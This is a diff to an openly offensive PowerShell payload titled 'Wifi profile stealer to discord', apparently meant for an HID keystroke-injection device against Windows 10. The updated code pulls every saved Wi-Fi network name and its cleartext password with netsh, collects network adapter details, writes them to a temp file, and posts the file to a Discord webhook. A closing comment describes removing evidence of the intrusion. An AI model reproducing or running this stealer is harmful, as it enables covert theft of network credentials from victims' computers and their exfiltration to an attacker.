@@ -1,7 +1,7 @@
 ################################################################
 # Title        : Wifi profile stealer to discord               #
 # Author       : JeffreyT72                                    #
-# Version      : 1.0                                           #
+# Version      : 2.0                                           #
 # Category     : Credentials, Exfiltration                     #
 # Target       : Windows 10                                    #
 # Mode         : HID                                           #
@@ -21,16 +21,43 @@
 #>
 
 #Stage 1 Obtain the credentials from the pc
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
-$WifiInfo = foreach($SSID in $WirelessSSIDs) {
-    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
-    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
-}  
-$WifiInfo | ConvertTo-Json
+Function Get-Networks {
+    # Get Network Interfaces
+    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+    # Get Wifi SSIDs and Passwords	
+    $WLANProfileNames =@()
+
+    #Get all the WLAN profile names
+    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+
+    #Trim the output to receive only the name
+    Foreach($WLANProfileName in $Output){
+        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+    }
+    $WLANProfileObjects =@()
+
+    #Bind the WLAN profile names and also the password to a custom object
+    Foreach($WLANProfileName in $WLANProfileNames){
+        #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
+        try{
+            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+        }catch{
+            $WLANProfilePassword = "The password is not stored in this profile"
+        }
+        #Build the object and add this to an array
+        $WLANProfileObject = New-Object PSCustomobject 
+        $WLANProfileObject | Add-Member -Type NoteProperty -Name "SSID" -Value $WLANProfileName
+        $WLANProfileObject | Add-Member -Type NoteProperty -Name "Password" -Value $WLANProfilePassword
+        $WLANProfileObjects += $WLANProfileObject
+        Remove-Variable WLANProfileObject    
+    }
+    return $WLANProfileObjects
+}
+$Networks = Get-Networks | ConvertTo-Json
 #Save them to a file in the temp folder.
-#Note: don't remove 'echo'
-echo $WifiInfo >> $env:TMP\$FileName
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+echo $Networks >> $env:TMP\$FileName
 
 #Stage 2 Discord message construct
 $fileContent = Get-Content -Path $env:TMP\$FileName | Out-String
@@ -39,9 +66,18 @@ $Body = @{
     'content' = $fileContent
 }
 
+$ErrorBody = @{
+    'username' = 'Wifi_Stealer'
+    'content' = 'Target missing or disabled wifi adapter'
+}
+
 #Stage 3 Upload them to Discord
 $WebhookUri = 'DISCORD WEBHOOK LINK HERE'
-Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($Body | ConvertTo-Json) -ContentType 'application/json'
+try {
+    Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($Body | ConvertTo-Json) -ContentType 'application/json'
+}catch {
+    Invoke-RestMethod -Uri $WebhookUri -Method POST -Body ($ErrorBody | ConvertTo-Json) -ContentType 'application/json'
+}
 
 #Stage 4 Cleanup Traces
 #This is to clean up behind you and remove any evidence to prove you were there
